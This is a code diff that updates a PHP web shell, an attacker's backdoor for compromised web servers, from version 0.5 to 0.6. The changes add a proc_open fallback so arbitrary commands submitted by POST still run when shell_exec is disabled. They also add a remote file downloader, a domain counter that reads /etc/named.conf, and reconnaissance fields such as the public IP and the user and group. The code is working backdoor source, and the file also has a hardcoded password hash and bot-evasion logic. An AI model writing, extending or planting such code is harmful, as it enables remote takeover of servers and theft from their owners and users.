@@ -1,6 +1,6 @@
 <?php
 session_start();
-define('APP_VER', '0.5');
+define('APP_VER', '0.6');
 $password = defined('PW') ? PW : '5c5fa09440696b310b4b1750d49f84ca';
 
 // Undetect bots
@@ -42,7 +42,13 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
         if($action=='command' && isset($_POST['cmd'])){
             $cmd_path = isset($_POST['path']) ? $_POST['path'] : getcwd();
             if (is_dir($cmd_path)) { chdir($cmd_path); }
-            if(function_exists('shell_exec')){$output = shell_exec($_POST['cmd'].' 2>&1');}else{$output="Server function disabled!";}
+            if(function_exists('shell_exec')){$output = shell_exec($_POST['cmd'].' 2>&1');}elseif (function_exists('proc_open')) {
+            $d = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']]; $p = proc_open($_POST['cmd'],$d,$pipes);
+            if (is_resource($p)) {
+                fclose($pipes[0]);
+                $output = stream_get_contents($pipes[1]).stream_get_contents($pipes[2]);
+                fclose($pipes[1]); fclose($pipes[2]); proc_close($p);
+            }else{$output="proc_open failed!";}}else{$output="Server function disabled!";}
             echo '<pre class="bg-black text-green-400 p-2 rounded">'.$output.'</pre>';
             exit;
         }
@@ -186,14 +192,57 @@ foreach ($parts as $part) {
 $self_dir = dirname(realpath(__FILE__));
 $docroot = realpath($_SERVER['DOCUMENT_ROOT']);
 
+//Count Domain
+function countDomains($f='/etc/named.conf'){
+    if(strtoupper(substr(PHP_OS,0,3))==='WIN') return '-';
+    if(!is_readable($f)) return "-";
+    $c=0;
+    foreach(file($f, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) as $l)
+        if(strpos($l,'zone')!==false && preg_match('#zone "(.*)"#',$l,$m) && strlen(trim($m[1]))>2) $c++;
+    return "$c Domain";
+}
+
+//Downloader
+function downloader($url, $dest = null) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        if ($dest === null) {
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            $data = curl_exec($ch);
+            curl_close($ch);
+            return $data !== false ? $data : false;
+        }
+        $fp = fopen($dest, 'w');
+        if (!$fp) return false;
+        curl_setopt($ch, CURLOPT_FILE, $fp);
+        $res = curl_exec($ch);
+        curl_close($ch);
+        fclose($fp);
+        return $res !== false;
+    }
+    if ($dest !== null && ini_get('allow_url_fopen')) {
+        return @copy($url, $dest);
+    }
+    return ini_get('allow_url_fopen') ? @file_get_contents($url) : false;
+}
+
+//Get Ip Public Info
+function getPublicIP(){return ($ip=downloader('https://api.ipify.org'))?$ip:gethostbyname(gethostname());}
+
 //Server info
 function getServerInfo(){
     return [
+        'Server IP' => getPublicIP(),
         'OS' => php_uname(),
         'PHP Version' => PHP_VERSION,
         'Server Software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'CLI',
-        'Disabled Functions' => ini_get('disable_functions'),
+        'Disabled Functions' => ($d = ini_get('disable_functions')) ? $d : '-',
         'Loaded Extensions' => implode(', ', get_loaded_extensions()),
+        'My IP' => isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '-',
+        'User:Group' => get_current_user() . ':' . (function_exists('posix_getgrgid') && function_exists('posix_geteuid') ? posix_getgrgid(posix_geteuid())['name'] : '?'),
+        'Domains' => countDomains()
     ];
 }
 ?>
@@ -360,9 +409,9 @@ if($action=='serverinfo'):
     <th class="p-2">Perm</th>
     <th class="p-2"><a href="<?=sort_url('mtime',$sort,$order,$path,$search)?>" class="hover:underline">Last Modified<?=($sort=='mtime'?($order=='asc'?' 🔼':' 🔽'):'')?></a></th>
     <th class="p-2">Action</th></tr>
-    <?php if($path != $parent): ?><tr class="border-t hover:bg-yellow-200 dark:hover:bg-gray-700"><td class="p-2"><a href="?path=<?=urlencode($parent)?>" class="text-blue-500">📁 ..</a></td><td class="p-2">-</td><td class="p-2">-</td><td class="p-2">-</td><td class="p-2">-</td></tr><?php endif; ?>
+    <?php if($path != $parent): ?><tr class="border-t hover:bg-yellow-200 dark:hover:bg-gray-700" title="Goto Parent Dir"><td class="p-2"><a href="?path=<?=urlencode($parent)?>" class="text-blue-500">📁 ..</a></td><td class="p-2">-</td><td class="p-2">-</td><td class="p-2">-</td><td class="p-2">-</td><td class="p-2"></td></tr><?php endif; ?>
     <?php foreach(array_merge($folders,$regular_files) as $f):$fp=$path.'/'.$f['name'];$mtime=date('Y-m-d\TH:i',$f['mtime']); ?>
-    <tr class="border-t hover:bg-yellow-200 dark:hover:bg-gray-700" title="<?=htmlspecialchars($f['name'])?>">
+    <tr class="border-t hover:bg-yellow-200 hover:text-gray-900" title="<?=htmlspecialchars($f['name'])?>">
     <td class="p-2"><?php if(is_dir($fp)):?><a href="?path=<?=urlencode($fp)?>" class="text-blue-500">📁 <?=htmlspecialchars($f['name'])?></a><?php else:?>📄 <?=htmlspecialchars($f['name'])?><?php endif;?></td>
     <td class="p-2"><?=htmlspecialchars($f['owner'])?></td>
     <td class="p-2"><?=htmlspecialchars($f['size'])?></td>
